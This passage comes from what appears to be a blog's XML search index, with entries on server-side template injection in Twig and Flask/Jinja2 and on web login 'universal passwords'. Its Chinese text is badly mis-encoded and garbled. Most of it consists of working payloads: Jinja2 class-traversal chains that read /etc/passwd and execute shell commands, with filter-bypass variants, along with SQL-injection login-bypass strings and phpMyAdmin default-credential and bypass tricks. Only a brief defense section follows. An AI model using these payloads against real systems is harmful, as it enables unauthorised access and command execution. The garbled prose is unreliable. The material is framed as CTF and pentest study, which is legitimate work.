,ÂàôÂú®ÊúçÂä°Á´ØÊãºÊé•ÁöÑÊ®°ÁâàÂÜÖÂÆπ‰∏∫: ËøôÈáåÁÆÄÂçïÂàÜÊûê‰∏Ä‰∏ã,Áî±‰∫é ‰Ωú‰∏∫ Twig Ê®°ÊùøÂºïÊìéÁöÑÈªòËÆ§Ê≥®ÈáäÂΩ¢Âºè,ÊâÄ‰ª•Âú®ÂâçÁ´ØËæìÂá∫ÁöÑÊó∂ÂÄôÂπ∂‰∏ç‰ºöÊòæÁ§∫,ËÄå 16 ‰Ωú‰∏∫Ê®°ÊùøÂèòÈáèÊúÄÁªà‰ºöËøîÂõû 16 ‰Ωú‰∏∫ÂÖ∂ÂÄºËøõË°åÊòæÁ§∫,Âõ†Ê≠§ÂâçÁ´ØÊúÄÁªà‰ºöËøîÂõûÂÜÖÂÆπ Hello IsVuln16OK ,Â¶Ç‰∏ãÂõæ: ÊºèÊ¥ûÂèëÊéòÊØè‰∏Ä‰∏™ÔºàÈáçÔºâÊ®°ÊùøÂºïÊìéÈÉΩÊúâÁùÄËá™Â∑±ÁöÑËØ≠Ê≥ïÔºàÁÇπÔºâ,Payload ÁöÑÊûÑÈÄ†ÈúÄË¶ÅÈíàÂØπÂêÑÁ±ªÊ®°ÊùøÂºïÊìéÂà∂ÂÆöÂÖ∂‰∏çÂêåÁöÑÊâ´ÊèèËßÑÂàô,Â∞±Â¶ÇÂêå SQL Ê≥®ÂÖ•‰∏≠ÊúâÁùÄ‰∏çÂêåÁöÑÊï∞ÊçÆÂ∫ìÁ±ªÂûã‰∏ÄÊ†∑„ÄÇ ÁÆÄÂçïÊù•ËØ¥,Â∞±ÊòØÊõ¥ÊîπËØ∑Ê±ÇÂèÇÊï∞‰Ωø‰πãÊâøËΩΩÂê´ÊúâÊ®°ÊùøÂºïÊìéËØ≠Ê≥ïÁöÑ Payload,ÈÄöËøáÈ°µÈù¢Ê∏≤ÊüìËøîÂõûÁöÑÂÜÖÂÆπÊ£ÄÊµãÊâøËΩΩÁöÑ Payload ÊòØÂê¶ÊúâÂæóÂà∞ÁºñËØëËß£Êûê,ÊúâËß£ÊûêÂàôÂèØ‰ª•Âà§ÂÆöÂê´Êúâ Payload ÂØπÂ∫îÊ®°ÊùøÂºïÊìéÊ≥®ÂÖ•,Âê¶Âàô‰∏çÂ≠òÂú® SSTI„ÄÇ Ê®°ÊùøËØ≠Ë®ÄÁöÑËØ≠Ê≥ïÂíå HTML ËØ≠Ê≥ïÁõ∏Â∑ÆÁîöÂ§ßÔºåÂõ†Ê≠§Êàë‰ª¨ÂèØ‰ª•Áî®ÂÖ∂Áã¨ÁâπÁöÑËØ≠Ê≥ïÊù•Êé¢ÊµãÊºèÊ¥û„ÄÇËôΩÁÑ∂ÂêÑÁßçÊ®°ÊùøÁöÑÂÆûÁé∞ÁªÜËäÇ‰∏çÂ§ß‰∏ÄÊ†∑Ôºå‰∏çËøáÂÆÉ‰ª¨ÁöÑÂü∫Êú¨ËØ≠Ê≥ïÂ§ßËá¥Áõ∏ÂêåÔºåÊàë‰ª¨ÂèØ‰ª•ÂèëÈÄÅÂ¶Ç‰∏ã payloadÔºö smarty=Hello ${7*7} Hello 49 freemarker=Hello ${7*7} Hello 49Êù•Á°ÆËÆ§ÊºèÊ¥û„ÄÇ Âú®‰∏Ä‰∫õÁéØÂ¢É‰∏ãÔºåÁî®Êà∑ÁöÑËæìÂÖ•‰πü‰ºöË¢´ÂΩì‰ΩúÊ®°ÊùøÁöÑÂèØÊâßË°å‰ª£Á†Å„ÄÇÊØîÂ¶ÇËØ¥ÂèòÈáèÂêçÔºö personal_greeting=username Hello user01ËøôÁßçÊÉÖÂÜµ‰∏ãÔºåXSS ÁöÑÊñπÊ≥ïÂ∞±Êó†Êïà‰∫Ü„ÄÇ‰ΩÜÊòØÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÁ†¥Âùè template ËØ≠Âè•ÔºåÂπ∂ÈôÑÂä†Ê≥®ÂÖ•ÁöÑHTMLÊ†áÁ≠æ‰ª•Á°ÆËÆ§ÊºèÊ¥ûÔºö personal_greeting=username&lt;tag&gt; Hello personal_greeting=username}}&lt;tag&gt; Hello user01 &lt;tag&gt;‰ΩÜÊòØÔºåÂ¶ÇÊûúÊ∏≤ÊüìÁöÑÊ®°ÁâàÂÜÖÂÆπÂèóÂà∞Áî®Êà∑ÁöÑÊéßÂà∂ÔºåÊÉÖÂÜµÂ∞±‰∏ç‰∏ÄÊ†∑‰∫Ü„ÄÇ‰øÆÊîπ‰ª£Á†Å‰∏∫Ôºö &lt;?php require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;); // Â∞ÜÁî®Êà∑ËæìÂÖ•‰Ωú‰∏∫Ê®°ÁâàÂÜÖÂÆπÁöÑ‰∏ÄÈÉ®ÂàÜ echo $output; ?&gt;‰∏äÈù¢ËøôÊÆµ‰ª£Á†ÅÂú®ÊûÑÂª∫Ê®°ÁâàÊó∂,ÊãºÊé•‰∫ÜÁî®Êà∑ËæìÂÖ•‰Ωú‰∏∫Ê®°ÊùøÁöÑÂÜÖÂÆπ,Áé∞Âú®Â¶ÇÊûúÂÜçÂêëÊúçÂä°Á´ØÁõ¥Êé•‰º†ÈÄí JavaScript ‰ª£Á†Å,Áî®Êà∑ËæìÂÖ•‰ºöÂéüÊ†∑ËæìÂá∫,ÊµãËØïÁªìÊûúÊòæËÄåÊòìËßÅ„ÄÇ Ê®°ÊùøÂºïÊìéÊ≥®ÂÖ•Ê®°ÊùøÂºïÊìéÔºàËøôÈáåÁâπÊåáÁî®‰∫éWebÂºÄÂèëÁöÑÊ®°ÊùøÂºïÊìéÔºâÊòØ‰∏∫‰∫Ü‰ΩøÁî®Êà∑ÁïåÈù¢‰∏é‰∏öÂä°Êï∞ÊçÆÔºàÂÜÖÂÆπÔºâÂàÜÁ¶ªËÄå‰∫ßÁîüÁöÑÔºåÂÆÉÂèØ‰ª•ÁîüÊàêÁâπÂÆöÊ†ºÂºèÁöÑÊñáÊ°£ÔºåÁî®‰∫éÁΩëÁ´ôÁöÑÊ®°ÊùøÂºïÊìéÂ∞±‰ºöÁîüÊàê‰∏Ä‰∏™Ê†áÂáÜÁöÑHTMLÊñáÊ°£„ÄÇ ‰∏Ä‰∫õÊ®°ÊùøÂºïÊìéÔºöSmartyÔºåMakoÔºåJinja2ÔºåJadeÔºåVelocityÔºåFreemakerÂíåTwigÔºåÊ®°ÊùøÊ≥®ÂÖ•ÊòØ‰∏ÄÁßçÊ≥®ÂÖ•ÊîªÂáªÔºåÂèØ‰ª•‰∫ßÁîü‰∏Ä‰∫õÁâπÂà´ÊúâË∂£ÁöÑÂΩ±Âìç„ÄÇÂØπ‰∫éAngularJSÁöÑÊÉÖÂÜµÔºåËøôÂèØËÉΩÊÑèÂë≥ÁùÄXSSÔºåÂπ∂‰∏îÂú®ÊúçÂä°Âô®Á´ØÊ≥®ÂÖ•ÁöÑÊÉÖÂÜµ‰∏ãÂèØËÉΩÊÑèÂë≥ÁùÄËøúÁ®ã‰ª£Á†ÅÊâßË°å„ÄÇ ÈáçÁÇπÊù•‰∫ÜÔºå‰∏çÂêåÂºïÊìéÊúâ‰∏çÂêåÁöÑÊµãËØï‰ª•ÂèäÊ≥®ÂÖ•ÊñπÂºèÔºÅ flask/jinja2Ê®°ÊùøÊ≥®ÂÖ•FlaskÊòØ‰∏Ä‰∏™‰ΩøÁî® Python ÁºñÂÜôÁöÑËΩªÈáèÁ∫ß Web Â∫îÁî®Ê°ÜÊû∂„ÄÇÂÖ∂ WSGI Â∑•ÂÖ∑ÁÆ±ÈááÁî® Werkzeug ÔºåÊ®°ÊùøÂºïÊìéÂàô‰ΩøÁî® Jinja2 FlaskÊ°ÜÊû∂‰∏≠Êèê‰æõÁöÑÊ®°ÁâàÂºïÊìéÂèØËÉΩ‰ºöË¢´‰∏Ä‰∫õÊó†ÈáèÂºÄÂèëËÄÖÂà©Áî®ÂºïÂÖ•‰∏Ä‰∏™ÊúçÂä°Á´ØÊ®°ÁâàÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÂ¶ÇÊûúÂØπÊ≠§ÊÑüÂà∞Êúâ‰∫õÂõ∞ÊÉëÂèØ‰ª•ÁúãÁúãJames KettleÂú®ÈªëÂ∏ΩÂ§ß‰ºö‰∏≠ÂàÜ‰∫´ÁöÑËÆÆÈ¢ò(PDF)ÔºåÁÆÄËÄåË®Ä‰πãËøô‰∏™ÊºèÊ¥ûÂÖÅËÆ∏Â∞ÜËØ≠Ë®Ä/ËØ≠Ê≥ïÊ≥®ÂÖ•Âà∞Ê®°Êùø‰∏≠„ÄÇÂú®ÊúçÂä°Âô®ÁöÑcontext‰∏≠ÊâßË°åËøô‰∏™ËæìÂÖ•ÈáçÁé∞ÔºåÊ†πÊçÆÂ∫îÁî®ÁöÑcontextÂèØËÉΩÂØºËá¥‰ªªÊÑèËøúÁ®ã‰ª£Á†ÅÊâßË°å(ËøúÁ´ØÊéßÂà∂ËÆæÂ§á)ÂèØ‰ª•ÂèÇËÄÉÊú¨ÂçöÂÆ¢ÊñáÁ´† Flask‰ªéÈõ∂Âà∞Êó† „ÄÇËøôÈáåÁªôÂá∫‰∏Ä‰∏™ÊºèÊ¥ûÁéØÂ¢É‰ª£Á†ÅÔºåÊú¨Âú∞ÊµãËØï from flask import Flask from flask import render_template from flask import request from flask import render_template_string app = Flask(__name__) @app.route(&apos;/test&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;]) def test(): template = &apos;&apos;&apos; &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; &apos;&apos;&apos; %(request.url) return render_template_string(template) if __name__ == &apos;__main__&apos;: app.debug = True app.run()‰ª£Á†ÅÁÆÄÊûêÔºö Êàë‰ª¨Ëá™Â∑±ÁÆÄÂçïÂÜô‰∏Ä‰∏™stringÁ±ªÂûãÁöÑ htmlÔºåhtmlËøîÂõûÂΩìÂâçurlÔºåÊàë‰ª¨ÊîæÂÖ•Âà∞Ê∏≤ÊüìÂáΩÊï∞render_template_stringËøõË°åÊ∏≤ÊüìÔºåÁÑ∂ÂêéÈ°µÈù¢‰ºöÊâìÂç∞Âá∫ÂΩìÂâçurlÔºåÂ¶ÇÊûúurlÈáåÂê´ÊúâÔΩõÔΩùÈÇ£‰πà‰æøÂèØ‰ª•ËøõË°åÊ®°ÊùøÊ≥®ÂÖ•„ÄÇ ÊµãËØïurl http://127.0.0.1:5000/test?{{config}} ÊµãËØïÁªìÊûúÂ¶Ç‰∏ãÔºö ËÄåÂ¶ÇÊûúÊàë‰ª¨‰ΩøÁî®render_templateÂáΩÊï∞Ôºå @app.route(&apos;/&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;]) @app.route(&apos;/index&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])#Êàë‰ª¨ËÆøÈóÆ/ÊàñËÄÖ/indexÈÉΩ‰ºöË∑≥ËΩ¨ def index(): return render_template(&quot;index.html&quot;,title=&apos;Home&apos;,user=request.args.get(&quot;key&quot;))index.html &lt;html&gt; &lt;head&gt; &lt;title&gt;{{title}} - Â∞èÁå™‰Ω©Â•á&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, {{user}}!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt;ÈÇ£‰πàÂ∞Ü‰∏ç‰ºöÊúâÊ®°ÊùøÊ≥®ÂÖ•ÔºåÂõ†‰∏∫render_templateÂ∑≤Áªè‰º†ÂÖ•‰∏Ä‰∏™Âõ∫ÂÆöÂ•Ω‰∫ÜÁöÑÊ®°ÊùøÔºåÊ≤°Ê≥ïÂÜçÂéª‰øÆÊîπÔºåÂú®Ê∏≤Êüì‰πãÂêé‰º†ÂÖ•Êï∞ÊçÆÔºåÂè™ÊúâÂΩìÁ¨¨‰∏ÄÁßç‰ª£Á†ÅÔºåÊàë‰ª¨Ê®°ÊùøÂèØÊéßÁöÑÊó∂ÂÄôÔºåÂÖà‰º†ÂÖ•ÂêéÊ∏≤ÊüìÔºåËøôÊ†∑Êâç‰ºöÂØºËá¥sstiÊ®°ÊùøÊ≥®ÂÖ•„ÄÇ ctf tips1.ÈÇ£‰πàÂÆûÊàòctf‰∏≠Â¶Ç‰ΩïÂà©Áî®Âë¢ÔºåÊó†ÈùûÊòØËØªÂèñÊñá‰ª∂ÊàñËÄÖgetshellÔºå Python‰∏≠Êúâ‰∏Ä‰∏™ .class ÂèØ‰ª•Ëé∑ÂèñÂÆû‰æãÂØπÂ∫îÁöÑÁ±ªÔºåÊØîÂ¶Ç‰∏Ä‰∏™Á©∫Â≠óÁ¨¶‰∏≤ ‚Äú‚Äù.classÂ∞±ÂèØ‰ª•Ëé∑ÂèñÂà∞ &lt;type‚Äôstr‚Äô&gt; ÔºåÈÇ£Ëøô‰∏™Â≠óÁ¨¶‰∏≤ÂêåÊ†∑‰πüÂèØ‰ª•Êç¢ÊàêÂàóË°®ÔºåÂÖÉÁªÑÔºåÂ≠óÂÖ∏„ÄÇ ‚Äú‚ÄùÂêåÊ†∑ÂèØ‰ª•Êç¢ÊàêÂÖÉÁªÑÔºåÂàóË°®Á≠â„ÄÇ print ().__class__.__bases__[0] &lt;type &apos;object&apos;&gt;ÂèØ‰ª•ÁúãÂà∞ÂÖÉÁªÑÁöÑÁà∂Á±ª‰∏∫objectÁ±ªÔºåobjectÊòØÊâÄÊúâÁ±ªÁöÑË∂ÖÁ±ªÔºåËÄå‰ªñ‰πã‰∏ãÂèàÊúâÂæàÂ§öÊñπÊ≥ïÂèØ‰ª•Ë∞ÉÁî®ÔºåÂåÖÊã¨file ËØªÂèñÔºåsystem osÁ≠âÊñπÊ≥ïÔºåÊàë‰ª¨ÂÜçÊü•Áúã‰ªñ‰πã‰∏ãÁöÑÊñπÊ≥ïÔºåÁÑ∂ÂêéÊâæÂà∞ÂØπÂ∫îÁöÑ‰ΩçÁΩÆÂéªË∞ÉÁî®„ÄÇÈáçÁÇπÊòØÂ∞ÜbojectÁ±ªÊâæÂà∞ÔºåÁÑ∂ÂêésubclassesÊâæ‰ªñÁöÑÊñπÊ≥ïÔºåÂÜç‰ªéÊñπÊ≥ï‰∏≠ÊâæÂà∞ÂêàÈÄÇÁöÑÊù•ËØªÂèñÊàñÊâßË°åÂëΩ‰ª§„ÄÇÂ¶Ç‰∏ãpocÔºå ().__class__.__bases__[0].__subclasses__() Âõ†‰∏∫().class.bases__‰∏∫objectÁ±ªÔºåÊâÄ‰ª•Êàë‰ª¨Áõ¥Êé•subclassesÊü•ÊâæÊñπÊ≥ïÔºåÂ¶ÇÊûú‰∏çÊòØobjectÁ±ªÔºåÂàôËøõ‰∏ÄÊ≠•baseÔºå().class.bases[0].subclasses()Â¶Ç‰∏ãpocÔºå poc http://127.0.0.1:5000/test?{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]}} Â∑≤ÁªèÊâæÂà∞‰∫ÜobjectÁ±ªÁÑ∂ÂêéËøõË°å‰∏ã‰∏ÄÊ≠•ÊñπÊ≥ïÂà©Áî®Â∞±ÂèØ‰ª•‰∫Ü„ÄÇ‰ªéËøô‰∫õÊñπÊ≥ï‰∏≠ÈÄâÂéªÂèØÂà©Áî®ÁöÑËøõË°å‰∏ã‰∏ÄÊ≠•Ê∏óÈÄè„ÄÇÂ¶ÇÁ¨¨ÂõõÂçÅ‰∏™‰∏∫&lt;type ‚Äòfile‚Äô&gt;ÊñπÊ≥ïÔºåÊàë‰ª¨Ë∞ÉÁî®ÊñπÊ≥ïËØªÂèñpocÔºö http://127.0.0.1:5000/test?{{().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()}}2.ÊâßË°åÂëΩ‰ª§poc ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls /var/www/html&quot;).read()&apos; ) object.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;) www.a.com/login.php{{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}initÁî®‰∫éÂ∞ÜÂØπË±°ÂÆû‰æãÂåñ ÂÖ∂‰ªñÁöÑÂà©Áî®ÊñπÂºèÊó†ÈùûÈÉΩÊòØËøô‰∏™Ê†ºÂºèÔºåÊñπÊ≥ïËá™Â∑±ÂéªÂØªÊâæÔºå 3.ÁªïËøáÔºàÂèÇËÄÉhttps://p0sec.net/index.php/archives/120/Ôºâctf‰∏≠‰∏çÂÖçÊúâ‰∏Ä‰∫õÂáΩÊï∞‰ºöË¢´ËøáÊª§ÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÊãºÊé•Â≠óÁ¨¶‰∏≤ÁöÑÊñπÂºèÊù•ÁªïËøáÂ¶Ç poc object.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;)Êã¨Âè∑ÈáåÁöÑÂ≠óÁ¨¶ÈÉΩÂèØ‰ª•ÈÄöËøá‚Äôa‚Äô+‚Äôa‚ÄôÁöÑÊñπÂºèÊù•ÁªÑÂêàÔºåÁªÑÂêàÂêé‰∏∫aaÔºå‰ª•Ê≠§Êù•ÁªïËøá getattributeÁªïËøá Êàë‰ª¨ÊÉ≥Ë¶ÅÁöÑ‰ª£Á†Å ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]ËøõË°åÂÖ≥ÈîÆÂ≠óÁªïËøá ().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;func_global&apos;+&apos;s&apos;)[&apos;linecache&apos;]‰∏§‰∏™‰∏çÂ∏∏ËßÅÁöÑÊâßË°å‰ªªÊÑèÂëΩ‰ª§ÁöÑÊñπÊ≥ïÔºö import timeittimeit.timeit(‚Äúimport(‚Äòos‚Äô).system(‚Äòdir‚Äô)‚Äù,number=1) import platformprint platform.popen(‚Äòdir‚Äô).read() Ëµ∞ÊäïÊó†Ë∑ØÊó∂ÁöÑpoc https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/ ÂèÇËÄÉÊñáÁ´†Ôºöhttps://blog.csdn.net/iamsongyu/article/details/83109772ÂèÇËÄÉÊñáÁ´†Ôºöhttps://www.freebuf.com/articles/web/88768.htmlÂèÇËÄÉÊñáÁ´†Ôºöhttps://www.freebuf.com/articles/web/98928.html flaskÊú¨Âú∞ÂÆûÊàòËÆ≤Ëß£ÁéØÂ¢É python3.6Ê®°Áâà flaskÂºïÊìé jinja2Ê∫êÁ†Å from flask import Flask from flask import render_template_string from flask import request app = Flask(__name__) @app.route(&apos;/test&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;]) def test(): template = &apos;&apos;&apos; &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; &apos;&apos;&apos; %(request.url) return render_template_string(template) if __name__ == &apos;__main__&apos;: app.run()1.ÂÖàÊâæobjectÁ±ªÔºåËøôÈáåÊàë‰ª¨Ê≤°ÈááÁî®Â∏∏ËßÑÁöÑ‚Äù‚Äù.classËÄåÊòØÁî®session[class] http://127.0.0.1:5000/test?{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]}}//Ëá≥‰∫éËøôÈáå‰∏∫Âï•&apos;__cla&apos;+&apos;ss__&apos;ÊòØ‰∏∫‰∫ÜÁªïËøá‰∏Ä‰∫õËøáÊª§Èò≤ÊÇ£Êú™ÁÑ∂„ÄÇÂ¶ÇÂõæÊàë‰ª¨ÊâæÂà∞‰∫ÜobjectÁ±ªÔºåÁÑ∂Âêé‰ªé‰∏≠ÊâæÊàë‰ª¨ÁÜüÊÇâÁöÑÁ±ªÂÜçÊâæÂáΩÊï∞ÔºåÊé•‰∏ãÊù•Êàë‰ª¨subclassesÊâæÂà∞ÊâÄÊúâÁöÑÁ±ªÔºåÊàë‰ª¨ÊâæÁÜüÊÇâÁöÑÁ±ª &lt;class ‚Äòos._wrap_close‚Äô&gt; Êü•ÊâæÊü•ÊâæÂõûÈ¶ñÊéèÔºåÁ¨¨118‰∏™Â∏∏ËßÑ.init.globalsÊâæÂà∞popenÂáΩÊï∞ÔºåÊâßË°åÂëΩ‰ª§ÊúÄÁªàpoc http://127.0.0.1:5000/test?{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()}}ÊâßË°åÂëΩ‰ª§ PHP/Ê®°ÁâàÂºïÊìéTwigÊ≥®ÂÖ•ÂèÇËÄÉÔºöhttps://www.freebuf.com/vuls/83999.html CTF‚ÄîÊ®°ÊùøÊ≥®ÂÖ•tornadoÁöÑ‰∏ÄÈÅì ssti https://blog.csdn.net/cccccfive/article/details/83145669 Èò≤Âæ°‰∏∫‰∫ÜÈò≤Ê≠¢Ê≠§Á±ªÊºèÊ¥ûÔºå‰Ω†Â∫îËØ•ÂÉè‰ΩøÁî®eval()ÂáΩÊï∞‰∏ÄÊ†∑Â§ÑÁêÜÂ≠óÁ¨¶‰∏≤Âä†ËΩΩÂäüËÉΩ„ÄÇÂ∞ΩÂèØËÉΩÂä†ËΩΩÈùôÊÄÅÊ®°ÊùøÊñá‰ª∂„ÄÇ Ê≥®ÊÑèÔºöÊàë‰ª¨Â∑≤ÁªèÁ°ÆÂÆöÊ≠§ÂäüËÉΩÁ±ª‰ºº‰∫érequire()ÂáΩÊï∞Ë∞ÉÁî®„ÄÇÂõ†Ê≠§Ôºå‰Ω†‰πüÂ∫îËØ•Èò≤Ê≠¢Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÔºàLFIÔºâÊºèÊ¥û„ÄÇ‰∏çË¶ÅÂÖÅËÆ∏Áî®Êà∑ÊéßÂà∂Ê≠§Á±ªÊñá‰ª∂ÊàñÂÖ∂ÂÜÖÂÆπÁöÑË∑ØÂæÑ„ÄÇ Âè¶Â§ñÔºåÊó†ËÆ∫Âú®‰ΩïÊó∂ÔºåÂ¶ÇÊûúÈúÄË¶ÅÂ∞ÜÂä®ÊÄÅÊï∞ÊçÆ‰º†ÈÄíÁªôÊ®°ÊùøÔºå‰∏çË¶ÅÁõ¥Êé•Âú®Ê®°ÊùøÊñá‰ª∂‰∏≠ÊâßË°åÔºå‰Ω†ÂèØ‰ª•‰ΩøÁî®Ê®°ÊùøÂºïÊìéÁöÑÂÜÖÁΩÆÂäüËÉΩÊù•Êâ©Â±ïË°®ËææÂºèÔºåÂÆûÁé∞ÂêåÊ†∑ÁöÑÊïàÊûú„ÄÇ ÈôÑË°®ÂèÇËÄÉÔºöhttps://www.anquanke.com/post/id/82856ÂèÇËÄÉÔºöhttps://zhuanlan.zhihu.com/p/28823933ÂèÇËÄÉÔºöhttps://www.cnblogs.com/tyomcat/p/5440488.html]]></content>
      <tags>
        <tag>Ê∏óÈÄèÊîªÈò≤</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webÊºèÊ¥û‰πãÂº±Âè£‰ª§]]></title>
    <url>%2F2018%2F11%2F11%2Fweb%E6%BC%8F%E6%B4%9E%E5%BC%B1%E5%8F%A3%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÔºöÂ∞ÜwebÊºèÊ¥û‰∏≠‰∏áËÉΩÂØÜÁ†Å‰πüÂΩíÁ±ª‰∫éÂº±Âè£‰ª§ÁØá„ÄÇ 1.phpmyadminphpmyadmin‰∏áËÉΩÂØÜÁ†ÅÂÖ∂ÂÆûÂ∫îËØ•Âè´phpmyadmin‰∏áËÉΩË¥¶Âè∑ÔºåÂõ†‰∏∫ÊòØÂú®Â∏êÂè∑Â§ÑËæìÂÖ•ÊºèÊ¥û‰ø°ÊÅØÔºåËÄåÂØÜÁ†Å‰∏çÈúÄË¶ÅËæìÂÖ• Áî®Êà∑ÂêçÂ§ÑÂÜôÂÖ•‚Äòlocalhost‚Äô@‚Äò@‚ÄùÂàôÁôªÂΩïÊàêÂäüÔºåÂØÜÁ†ÅÊó†ÈúÄËæìÂÖ• (ÂÖ®ÈÉ®‰∏∫Ëã±ÊñáÊ†áÁÇπÁ¨¶Âè∑) phpmyadmin ÁàÜÁªùÂØπË∑ØÂæÑ phpMyAdmin/libraries/select_lang.lib.php phpMyAdmin/darkblue_orange/layout.inc.php phpMyAdmin/index.php?lang[]=1 phpmyadmin/themes/darkblue_orange/layout.inc.php ÊºèÊ¥ûÂΩ±ÂìçÁâàÊú¨ 2.11.4 Ôºå 2.11.3 phpmyadminÂº±Âè£‰ª§phpMyAdminÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†ÅÁî®Êà∑Âêç rootÂØÜÁ†Å rootÊàñÁ©∫ÁôªÈôÜ„ÄÇ phpmyadmin rootÁ©∫ÂØÜÁ†Å Áî®Êà∑Âêç root ÁôªÈôÜÔºåÊó†ÈúÄÂØÜÁ†Å„ÄÇ ÊºèÊ¥ûÂΩ±ÂìçÁâàÊú¨ 2.11.9.2 2.webÂêéÂè∞Á´ô‰∏áËÉΩÂØÜÁ†Å admin&apos;or&apos;1&apos;=&apos;1 &apos;UNION SELECT 1, &apos;anotheruser&apos;, &apos;doesnt matter&apos;, 1‚Äì &quot;or&quot;a&quot;=&quot;a &apos;xor &apos;or&apos;=&apos;or&apos; Ôºàasp„ÄÅaspxÁöÑ‰∏áËÉΩÂØÜÁ†ÅÔºâ 1Ôºö&quot;or &quot;a&quot;=&quot;a 2Ôºö&apos;)or(&apos;a&apos;=&apos;a 3Ôºö&apos;or&apos;=&apos;or&apos; 4Ôºö&apos;or 1=1‚Äì 5Ôºöa&apos;or&apos; 1=1‚Äì 6Ôºö&quot;or 1=1‚Äì 7Ôºö&apos;or&apos;a&apos;=&apos;a 8Ôºö&quot;or&quot;=&quot;a&apos;=&apos;a 9Ôºö&apos;or&quot;=&apos; 10Ôºöadmin&apos;or&apos;1=1 11:1 or &apos;1&apos;=&apos;1&apos;=1 12:1 or &apos;1&apos;=&apos;1&apos; or 1=1 13:&apos;OR 1=1%00 14:&apos;or 1=1%00 15:&apos;xor &apos;or&apos;=&apos;or&apos; ÔºàPHPÁöÑ‰∏áËÉΩÂØÜÁ†ÅÔºâ or 1=1/* UserÔºösomething PassÔºöOR 1=1 ÔºàjspÁöÑ‰∏áËÉΩÂØÜÁ†ÅÔºâ 1or1=1 admin OR 1=1/* xpathÊ≥®ÂÖ•‰∏áËÉΩÂØÜÁ†Å &quot;or 1=1 or &quot;=&apos;‰∏áËÉΩÂØÜÁ†ÅÂéüÁêÜÔºö Áî±‰∫é‰∏Ä‰∫õÁΩëÁ´ôÂêéÂè∞ËæìÂÖ•Ë¥¶Âè∑ÂØÜÁ†ÅÊú™ËøõË°åÂ≠óÁ¨¶ËøáÊª§ÂØºËá¥sqlÊ≥®ÂÖ•‰∏áËÉΩÂØÜÁ†ÅÂ¶Ç‰∏ã‰∏∫ ÁôªÈôÜÊ∫êÁ†ÅËØ≠Âè•select * from user where username=‚Äô$user‚Äô and password =‚Äô$pass‚Äô ËæìÂÖ•‰∏áËÉΩÂØÜÁ†Å ‚Äòor‚Äô1‚Äô=‚Äô1select * from user where username=‚Äô‚Äôor ‚Äò1‚Äô=‚Äô1‚Äô and password =‚Äô‚Äô or‚Äô1‚Äô=‚Äô1‚Äô ÂèØ‰ª•ÁúãÂà∞ or Áõ¥Êé•ÁªïËøáÔºå‰ΩøÂæóÂà§Êñ≠ÈÄªËæëËØ≠Âè•‰∏ÄÁõ¥‰∏∫ÁúüÔºåÂØπ‰∫é‰∏Ä‰∫õ‰ª£Á†ÅÂèØ‰ª•ËøõË°åÁªïËøá‰∏áËÉΩÂØÜÁ†ÅËøõÂÖ•ÂêéÂè∞ÔºåËøôÊ†∑SQLËøîÂõûÁöÑÂÄºÂßãÁªà‰∏∫1ÔºåÂ∞±ÊàêÂäüÁªïËøá‰∫ÜÁ®ãÂ∫èÁöÑÈ™åËØÅ„ÄÇ]]></content>
      <tags>
        <tag>webÊºèÊ¥û</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jsonÂèäjsonpÊ≥®ÂÖ•]]></title>
    <url>%2F2018%2F11%2F05%2Fjsonp%E6%B3%A8%E5%85%A5%2F</url>
